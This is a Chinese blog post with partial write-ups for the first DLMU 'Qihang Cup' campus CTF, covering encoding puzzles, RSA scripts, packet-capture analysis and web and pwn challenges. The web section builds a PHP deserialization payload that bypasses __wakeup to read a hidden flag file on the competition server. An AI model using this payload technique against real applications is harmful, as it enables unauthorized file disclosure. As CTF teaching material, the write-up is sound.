<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>大连海事大学第一届“启航杯”DLMU CTF部分题解 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="大连海事大学第一届“启航杯”DLMU CTF部分题解" />
<meta property="og:description" content="大连海事大学第一届“启航杯”CTF校园网络安全竞赛 签到题 0. dlmuctf2020 flag{welcome_to_dlmuctf2020}
dlmuctf{welcome_to_dlmuctf2020}
1. 早安，贝丝人 TVJXRzI1TERPUlRIV1NCV09aU1Y2TlM3TTRZREFaQzdNUTNIU0lMNQ==
​ 很明显的Base64编码，解密后得到MRWG25LDORTHWSBWOZSV6NS7M4YDAZC7MQ3HSIL5,在进行Base32解码，拿到flag：dlmuctf{H6ve_6_g00d_d6y!}
Misc 2. lsp了 ​ 题目叫lsp，第一反应想到的就是LSB加密。
可以看到，PK开头，可知是zip压缩文件，保存，打开，得到flag：flag{Good_Job_kkk}
3. base2sth ​ 打开flag.txt,里边有一堆代码，简单看一下，字母全是小写，最高位没有超过f，推测是HEX编码，解码一下。解码后，可以在开头位置看到data:image/png;base64 说明是Base64加密的图片，Base64转图片得到flag。
4. docz ​ 下载下来是docx文件，但是打不开，第一反应看16进制，用010editor打开
​ 明显PK开头，改后缀名为zip，打开后里边又是一层zip，打开里边有一个密码.zip，打开后内部是加密的，结合注释“真的有密码？”猜测是伪加密，用010editor打开，去除伪加密，打开里边的爆破.zip，根据提示6位数字密码，进行zip爆破，爆破得到密码233333（过程不展示了，工具到处都是），打开得到flag。
5. jigsaw ​ 题目叫做jigsaw，翻译一下就是拼图的意思，打开压缩包，里边有黑白图片一共10000张，推测是拼起来是个二维码，这里用的工具是ImageMagick 下的montage （具体安装方法百度吧）
​ 在终端下输入：
montage *.png -tile 100X100 -geometry &#43;0&#43;0 flag.png ​ 运行后得到flag.png
直接扫扫不出来，我当时是拖到word里加个滤镜，缩小一下扫出来的。。。
P.S.这道题做得我血压飙升，一万张图，在虚拟机跑好久，切一下后台kali就给我杀进程。。。期间卡死无数次。。。
Crypto 6. 经典三合一 ​ o{rnhBuRcj_Hjb_uN?p_auJ}
​ 先栅栏得oujp{Rb_rc_anjuuh_NJBH?}，再凯撒得到flag{Is_it_really_EASY?}
7. XOR ​ 题目XOR，肯定就是异或了，百度查阅了好多异或加密的资料，写代码：
#include &lt;stdio.h&gt; main() { char a[]=&#34;DsfvD-jZ|,&#43;p}sX.zIfvzYrh|pSvWMX&#39;&#34;; char c[100]; int i; for(int j=1;j&lt;200;j&#43;&#43;) { for(i=0;a[i];i&#43;&#43;) c[i]=a[i]^j; printf(&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/7a4c7c10be697dffc2669ec81c2a18a5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-12-13T11:29:32+08:00" />
<meta property="article:modified_time" content="2020-12-13T11:29:32+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">大连海事大学第一届“启航杯”DLMU CTF部分题解</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="CTF_0"></a>大连海事大学第一届“启航杯”CTF校园网络安全竞赛</h2> 
<h3><a id="_2"></a>签到题</h3> 
<h4><a id="0_dlmuctf2020_4"></a>0. dlmuctf2020</h4> 
<p>flag{welcome_to_dlmuctf2020}<br> dlmuctf{welcome_to_dlmuctf2020}</p> 
<h4><a id="1__9"></a>1. 早安，贝丝人</h4> 
<p><code>TVJXRzI1TERPUlRIV1NCV09aU1Y2TlM3TTRZREFaQzdNUTNIU0lMNQ==</code></p> 
<p>​ 很明显的Base64编码，解密后得到<code>MRWG25LDORTHWSBWOZSV6NS7M4YDAZC7MQ3HSIL5</code>,在进行Base32解码，拿到flag：<code>dlmuctf{H6ve_6_g00d_d6y!}</code></p> 
<h3><a id="Misc_15"></a>Misc</h3> 
<h4><a id="2_lsp_17"></a>2. lsp了</h4> 
<p>​ 题目叫lsp，第一反应想到的就是LSB加密。<br> <img src="https://images2.imgbox.com/f3/9f/bobqCN5A_o.png" alt="image-20201206204813556"></p> 
<p>可以看到，PK开头，可知是zip压缩文件，保存，打开，得到flag：<code>flag{Good_Job_kkk}</code></p> 
<h4><a id="3_base2sth_24"></a>3. base2sth</h4> 
<p>​ 打开flag.txt,里边有一堆代码，简单看一下，字母全是小写，最高位没有超过f，推测是HEX编码，解码一下。解码后，可以在开头位置看到<code>data:image/png;base64</code> 说明是Base64加密的图片，Base64转图片得到flag。</p> 
<p><img src="https://images2.imgbox.com/49/84/6r9R7XL1_o.png" alt="index"></p> 
<h4><a id="4_docz_30"></a>4. docz</h4> 
<p>​ 下载下来是docx文件，但是打不开，第一反应看16进制，用010editor打开<br> <img src="https://images2.imgbox.com/cb/74/2zXTbxAP_o.png" alt="image-20201206210026771"><br> ​ 明显PK开头，改后缀名为zip，打开后里边又是一层zip，打开里边有一个密码.zip，打开后内部是加密的，结合注释“真的有密码？”猜测是伪加密，用010editor打开，去除伪加密，打开里边的爆破.zip，根据提示6位数字密码，进行zip爆破，爆破得到密码233333（过程不展示了，工具到处都是），打开得到flag。</p> 
<h4><a id="5_jigsaw_36"></a>5. jigsaw</h4> 
<p>​ 题目叫做jigsaw，翻译一下就是拼图的意思，打开压缩包，里边有黑白图片一共10000张，推测是拼起来是个二维码，这里用的工具是<code>ImageMagick</code> 下的<code>montage</code> （具体安装方法百度吧）</p> 
<p>​ 在终端下输入：</p> 
<pre><code class="prism language-powershell">montage <span class="token operator">*</span><span class="token punctuation">.</span>png <span class="token operator">-</span>tile 100X100 <span class="token operator">-</span>geometry <span class="token operator">+</span>0<span class="token operator">+</span>0 flag<span class="token punctuation">.</span>png
</code></pre> 
<p>​ 运行后得到flag.png<br> <img src="https://images2.imgbox.com/c9/fe/IP8p9fwy_o.png" alt="flag1"></p> 
<p>直接扫扫不出来，我当时是拖到word里加个滤镜，缩小一下扫出来的。。。<br> <img src="https://images2.imgbox.com/98/53/CQXeHtfH_o.png" alt="image-20201206211918825"></p> 
<p>P.S.这道题做得我血压飙升，一万张图，在虚拟机跑好久，切一下后台kali就给我杀进程。。。期间卡死无数次。。。</p> 
<h3><a id="Crypto_54"></a>Crypto</h3> 
<h4><a id="6__56"></a>6. 经典三合一</h4> 
<p>​ <code>o{rnhBuRcj_Hjb_uN?p_auJ}</code></p> 
<p>​ 先栅栏得<code>oujp{Rb_rc_anjuuh_NJBH?}</code>，再凯撒得到<code>flag{Is_it_really_EASY?}</code></p> 
<h4><a id="7_XOR_62"></a>7. XOR</h4> 
<p>​ 题目XOR，肯定就是异或了，百度查阅了好多异或加密的资料，写代码：</p> 
<pre><code class="prism language-C++">    #include &lt;stdio.h&gt;
    main()
    {
       char a[]="DsfvD-jZ|,+p}sX.zIfvzYrh|pSvWMX'";
       char c[100];
       int i;

       for(int j=1;j&lt;200;j++)
        {
       for(i=0;a[i];i++)
          c[i]=a[i]^j;
       printf("You Password: %s\n",c);
        }
    }

</code></pre> 
<p>运行结果：</p> 
<p><img src="https://images2.imgbox.com/34/99/QWaysAVK_o.png" alt="image-20201206213300730"></p> 
<p>这个时候就要看你对Base64的敏感度了，最后一行很像Base64，直接一手解码，啪！很快啊，拿到flag：<code>flag{Congratulations!!!}</code></p> 
<h4><a id="8_RSA_90"></a>8. RSA</h4> 
<p>​ RSA是一种很经典的加密算法，以前只听说过没有研究过，查了好多资料后，大概了解了，用Python写代码：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> gmpy2
p<span class="token operator">=</span><span class="token number">0xEB4360DF0E0C824D57AE20700BBF6C1BA8324A94DB7B3608DDA40DE07A59082F</span>
q<span class="token operator">=</span><span class="token number">0xA5B8BA7304F15C70BA82FF60F8A4A5F156ED04896EC94A7E99B96B4E11727A8F</span>
e<span class="token operator">=</span><span class="token number">0x10001</span>
c<span class="token operator">=</span><span class="token number">5849414025349869533962909975439563212209275395646853474539897994585461763870010917408284076946095324877247807213532724048271531587570791138002392138818496</span>
n<span class="token operator">=</span>p<span class="token operator">*</span>q
s <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"hex: "</span> <span class="token operator">+</span>  <span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>​ 把得到的16进制的明文HEX转码，拿到flag</p> 
<h4><a id="9_RSA_plus_109"></a>9. RSA_plus</h4> 
<p>​ 这道题给出了dp的值，查阅资料后，发现这叫dp泄露，进行简单的公式推导之后，写代码：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> binascii
n<span class="token operator">=</span><span class="token number">0x83A9DEF3CC906B08B926C896F3109D080E6DA3BA0744D15D1ED23CEBC7F67F0152B6FF8031F65702A991B0B41D81C4DD2840111ADE9CD1556178CB9D52B90409</span>
e<span class="token operator">=</span><span class="token number">0x10001</span>
dp<span class="token operator">=</span><span class="token number">10932553400881682210635683321183648664355266541474849157856482711967041983033</span>
c<span class="token operator">=</span><span class="token number">2258623409939733607655186579366743081899436099271191036894164042692086967635362871866346793891828960372212557879413400241461275122361638369464235153663059</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">%</span>x<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        p<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>x<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span>p<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        q<span class="token operator">=</span>n<span class="token operator">//</span>p
        phin<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span>
        m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>          
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>把得到的16进制的明文HEX转码，拿到flag</p> 
<h3><a id="Reverse_136"></a>Reverse</h3> 
<h4><a id="9_just_run_138"></a>9. just_run</h4> 
<p>这道题，下载下来之后，首先试了一下改兼容性，无果。</p> 
<p>然后第一反应用IDA打开，对着代码瞅了半天，看不懂。</p> 
<p>想用IDA调试，折腾半天，整不好环境。（菜哭了）</p> 
<p>IDA里看代码知道了是要用DOS运行，想装个DOS虚拟机。</p> 
<p>后来还是觉得太麻烦了，最后发现了DOSBOX这个东西，嗯，很有精神！</p> 
<p>在DOSBOX里跑了一下，拿到flag</p> 
<h3><a id="Web_152"></a>Web</h3> 
<h4><a id="10_wireshark1_154"></a>10. wireshark1</h4> 
<p>wireshark打开，根据题目提示：过滤FTP</p> 
<p>追踪TCP流，找到password</p> 
<p><img src="https://images2.imgbox.com/0e/ef/26lss6p4_o.png" alt="image-20201206222501955"></p> 
<h4><a id="11__162"></a>11. 海事官网简化版</h4> 
<p>​ 有点意思的一道题目，一开始我就踩到了出题人的坑。。。</p> 
<p><img src="https://images2.imgbox.com/a5/87/Kv9f0xBK_o.png" alt="image-20201206215459075"></p> 
<p>他说我搜不到flag，我TM就是要搜一下试试，然后就一直研究这个查询按钮。。。</p> 
<p>最后重新看了一遍源代码，找到关键</p> 
<pre><code class="prism language-html">          <span class="token comment">&lt;!--    ZmxhZw==  ： ZmxhZ3tETVUtQ1RGX1dFQi1tcGNfY2h1dGkxMTI2MTg0OX0= --&gt;</span>&lt;a
</code></pre> 
<p>Base64解码<code>flag{DMU-CTF_WEB-mpc_chuti11261849}</code></p> 
<h4><a id="12__178"></a>12. 超级人肉计算机</h4> 
<p>比赛前两天看到过类似的题，正则提取题目，然后提交。Python写代码：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re   

url <span class="token operator">=</span> <span class="token string">'http://123.206.31.85:10002/'</span>

source <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+*])+(\d+[+*])+\((\d+[+*])+(\d+)\)'</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span>
val <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
post <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'result'</span><span class="token punctuation">:</span> val<span class="token punctuation">}</span>
result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<p>得到flag：<code>flag{b37d6bdd7bb132c7c7f6072cd318697c}</code></p> 
<h4><a id="13__200"></a>13. 你看不见我</h4> 
<p>看网页源代码，拉到最底下，看到</p> 
<pre><code class="prism language-html"><span class="token comment">&lt;!--/index/index.php--&gt;</span>
</code></pre> 
<p>打开<code>http://123.206.31.85:10024/index/index.php</code> 看到php代码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name">Small_white_rabbit</span><span class="token punctuation">{<!-- --></span> 
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">;</span> 

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 

    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
            <span class="token comment">//the secret is in the_f1ag.php </span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token delimiter important">?&gt;</span>
</code></pre> 
<p>可以看到是对var这个变量先序列化，再进行base64的编码。</p> 
<p>构造php代码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Small_white_rabbit</span><span class="token punctuation">{<!-- --></span> 
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'the_f1ag.php'</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>  
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Small_white_rabbit</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">":1:"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">":2:"</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span>
</code></pre> 
<p>把echo的值构造payload：</p> 
<pre><code class="prism language-php">http<span class="token punctuation">:</span><span class="token comment">//123.206.31.85:10024/index/index.php?var=TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==</span>
</code></pre> 
<p>拿到flag：</p> 
<pre><code class="prism language-php"> <span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag{47e85057bb9a8a1b};</span>
<span class="token delimiter important">?&gt;</span> 
</code></pre> 
<h4><a id="14__wireshark2_271"></a>14. wireshark2</h4> 
<p>用wireshark打开，导入题目给的ssllog.log密钥，过滤http。</p> 
<p>然后就开始各种找。。。。</p> 
<p>搜索login追踪TLS流，最后找到。。。。。</p> 
<p><img src="https://images2.imgbox.com/13/74/c2FGKlvl_o.png" alt="image-20201206223256252"></p> 
<p><img src="https://images2.imgbox.com/da/57/gmlp2WXO_o.png" alt="image-20201206223339304"></p> 
<p><code>username=dlmuctf2020</code></p> 
<h4><a id="15_wireshark_js_285"></a>15. wireshark_js</h4> 
<p>用wireshark打开，导入ssllog.log密钥，过滤http</p> 
<p>紧接上题，找到同一个位置，还是差不多同样一坨代码，然后就不知道怎么下手了。</p> 
<pre><code class="prism language-php"><span class="token constant">HTML</span> Form <span class="token constant">URL</span> Encoded<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
    Form item<span class="token punctuation">:</span> <span class="token double-quoted-string string">"username"</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"dlmuctf"</span>
    Form item<span class="token punctuation">:</span> <span class="token double-quoted-string string">"type"</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"UsernamePassword"</span>
    Form item<span class="token punctuation">:</span> <span class="token double-quoted-string string">"_eventId"</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"submit"</span>
    Form item<span class="token punctuation">:</span> <span class="token double-quoted-string string">"geolocation"</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span>
    Form item<span class="token punctuation">:</span> <span class="token double-quoted-string string">"execution"</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"30291c18-3c1f-4902-9fdd-6741d76770af_H4sIAAAAAAAAAO1ae2wcRxkfnx+xHSex82oDagghsUpL7n2+u6amvZzt5NKz4/rsJHUJydzu3Hnjvd3N7px9F1BKhEpfRG2lNkpJQalUiRJCU6l/tAoKbVWkAmqRKC2PoiCBmkeFqACBKgFS+Wb2cQ+fL+fCX+hOvvPuzDfffDPz+x7z
        Key: execution
        Value [truncated]: 30291c18-3c1f-4902-9fdd-6741d76770af_H4sIAAAAAAAAAO1ae2wcRxkfnx+xHSex82oDagghsUpL7n2+u6amvZzt5NKz4/rsJHUJydzu3Hnjvd3N7px9F1BKhEpfRG2lNkpJQalUiRJCU6l/tAoKbVWkAmqRKC2PoiCBmkeFqACBKgFS+Wb2cQ+fL+fCX+hOvvPuzDfffDPz+x7zzZz7M2
    Form item: "</span>captcha_code<span class="token double-quoted-string string">" = "</span><span class="token double-quoted-string string">"
    Form item: "</span>croypto<span class="token double-quoted-string string">" = "</span>Up0p1bMqJvQ<span class="token operator">=</span><span class="token double-quoted-string string">"
    Form item: "</span>password<span class="token double-quoted-string string">" = "</span>kcQMc1GkwN2<span class="token operator">/</span>jOXyCHuBBilFZ9WFg1U3EBft1<span class="token operator">+</span>sY0n1A7sVQjzcDGg<span class="token operator">==</span>"
</code></pre> 
<p>这些代码很接近Base64，但是解不出来。。。。实在是很难受</p> 
<p>过了好久。。。。。就在百度上乱搜。。。</p> 
<p>直到我搜到了<code>croypto</code> 然后找到了这样一篇blog：</p> 
<p>参考资料：https://blog.csdn.net/weixin_43272781/article/details/107331432</p> 
<p>参考资料2：https://shentuzhigang.blog.csdn.net/article/details/107323907</p> 
<p>很相似了，然后我知道了这是DES加密</p> 
<p>先把<code>croypto</code>字段解码成16进制格式</p> 
<p><img src="https://images2.imgbox.com/ae/f5/Yb6PMiaS_o.png" alt="image-20201206224259419"></p> 
<p>然后进行DES解密，在线地址：https://the-x.cn/cryptography/Des.aspx</p> 
<p><img src="https://images2.imgbox.com/c4/54/i47ydiSa_o.png" alt="image-20201206224424382"></p> 
<p>拿到flag。</p> 
<h3><a id="Pwn_327"></a>Pwn</h3> 
<h4><a id="16__329"></a>16. 查字典</h4> 
<p>感觉这道题比第二道难啊啊！</p> 
<p>在kali下</p> 
<pre><code class="prism language-bash"><span class="token variable">$ncat</span> 172.27.97.232 2628
</code></pre> 
<p>会出现</p> 
<pre><code class="prism language-bash"><span class="token variable">$ncat</span> 172.27.97.232 2628                                                                             220 dell-Precision-7920-Tower dictd 1.12.1/rf on Linux 4.15.0-1102-oem <span class="token operator">&lt;</span>auth.mime<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>301.15714.1607266042@dell-Precision-7920-Tower<span class="token operator">&gt;</span>
</code></pre> 
<p>然后不管我输入啥都会返回一个<code>500 unknown command</code> ，后来我想，既然是command，那我试试输个help试试，然后就得到了</p> 
<p><img src="https://images2.imgbox.com/23/aa/U3Apa4Ky_o.png" alt="image-20201206225029472"></p> 
<p>这，那这就很是Amazing了啊！后来查阅资料这是一种DICT协议，研究了好半天这种协议。。。感觉帮助不大</p> 
<p>先搜他一手flag <code>DEFINE * flag</code></p> 
<p><img src="https://images2.imgbox.com/20/2b/xHVrnvsR_o.png" alt="image-20201206225258267"></p> 
<p>啊，这啥呀，对着百度翻译半天，大体了解了，一开始我就把重点放到了第一段，<code>See also {hidden flag},{mode bit}</code>上,成功避开了正确的路，找了好半天没有结果，后来回过头再看第二段最后，<code>(i.e., dlmuctf2020)</code></p> 
<p>搜一下试试，<code>D * dlmuctf2020</code>,get!</p> 
<p><img src="https://images2.imgbox.com/8b/0f/3RkAu6Cq_o.png" alt="image-20201206225807643"></p> 
<h4><a id="17_1_361"></a>17. 学生管理系统1</h4> 
<p>在kali下</p> 
<pre><code class="prism language-bash"><span class="token variable">$ncat</span> 172.27.97.232 2000
</code></pre> 
<p>发现让输入密码，打开git看一下，发现并没有密码，看历史改动，找到了被删除的明文密码：<code>A_sImp1e_s7u6eN4_mAna9eme2t_s6s4eM</code></p> 
<p>输入密码后</p> 
<p><img src="https://images2.imgbox.com/66/8e/KnDP8Nrc_o.png" alt="image-20201206230136614"></p> 
<p>输入指令后提示要先读取文件，靠直觉试了试flag，不对，又试了一下flag.txt</p> 
<p><img src="https://images2.imgbox.com/05/c7/HtO4kbdl_o.png" alt="image-20201206230344785"></p> 
<p>但是还有个问题，有个计时函数，每次我操作一会之后就会断开，很烦，然后就想到了构造代码，用管道符输入。</p> 
<p>构造代码：</p> 
<pre><code class="prism language-C++">#include&lt;stdio.h&gt;
int main()
{
	printf("A_sImp1e_s7u6eN4_mAna9eme2t_s6s4eM\n");
	printf("3\n");
	printf("flag.txt\n");
	printf("4\n");
}
</code></pre> 
<p>编译：</p> 
<pre><code class="prism language-bash"><span class="token variable">$gcc</span> a.cpp -o a
</code></pre> 
<p>终端输入：</p> 
<pre><code class="prism language-bash">$./a <span class="token operator">|</span> ncat 172.27.97.232 2000
</code></pre> 
<p><img src="https://images2.imgbox.com/71/53/jLqi2mUg_o.png" alt="image-20201206230910854"></p> 
<p>get!</p> 
<pre><code>学号:16001 班级:3 姓名:W 专业:SC 成绩1:98 成绩2:89 成绩3:100 总成绩:287 平均成绩:95.666664
学号:16002 班级:1 姓名:G 专业:NE 成绩1:97 成绩2:100 成绩3:79 总成绩:276 平均成绩:92.000000
学号:17001 班级:1 姓名:git_iS_A 专业:_mAs4erp1ece 成绩1:12 成绩2:34 成绩3:0 总成绩:46 平均成绩:15.333333
</code></pre> 
<p>flag:<code>dlmuctf{git_iS_A_mAs4erp1ece}</code></p> 
<h4><a id="18_Pwn_419"></a>18. Pwn简单大综合</h4> 
<p>真的不会了，代码也看不懂，太菜了。。。。。。。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/32a037e5f14f0051b1398cfe1b65dcdc/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
